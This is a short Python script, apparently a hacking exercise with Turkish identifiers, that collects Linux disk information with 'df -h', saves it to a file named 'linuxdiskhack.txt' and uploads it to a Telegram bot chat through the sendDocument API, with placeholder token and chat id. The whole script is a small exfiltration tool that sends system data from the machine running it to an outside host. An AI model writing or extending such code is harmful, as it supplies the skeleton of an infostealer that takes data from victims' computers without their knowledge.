import requests 
import subprocess
 
TOKEN = "tokeniniz"
chat_id = "chat_id"

def diskbilgial_linux(): # Linux

    disk_info = subprocess.run(["df", "-h"], stdout=subprocess.PIPE, text=True)
    çıktı = disk_info.stdout

  
    with open("linuxdiskhack.txt", "w") as dosya:
        dosya.write(çıktı) 
    
    
    dosyakonumu = subprocess.run(["realpath", "linuxdiskhack.txt"], stdout=subprocess.PIPE, text=True)
    dosyakonumu_str = dosyakonumu.stdout.strip()
    file_path = "linuxdiskhack.txt"
    
    api = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    
    with open(file_path, "rb") as file:
        files = {"document": open(file_path, "rb")}
        response = requests.post(api, data={"chat_id": chat_id}, files=files)

diskbilgial_linux()
